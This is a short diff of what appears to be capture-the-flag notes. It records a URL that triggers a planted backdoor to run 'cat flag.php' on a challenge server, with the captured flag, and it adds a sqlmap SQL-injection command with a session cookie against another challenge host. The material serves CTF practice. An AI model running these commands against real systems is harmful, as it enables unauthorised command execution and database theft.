@@ -21,6 +21,8 @@
 
 8 nondiff-backdoor   grep -r "shell.exec"    34.159.62.179:30876/?welldone=knockknock&shazam=cat flag.php    CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}
 
+9 schematick sqlmap -u http://34.159.62.179:32027/index.php  --cookie="PHPSESSID=e40e1c0f2baba9b6b6d07033355f0819" --forms --columns
+
 
 
 
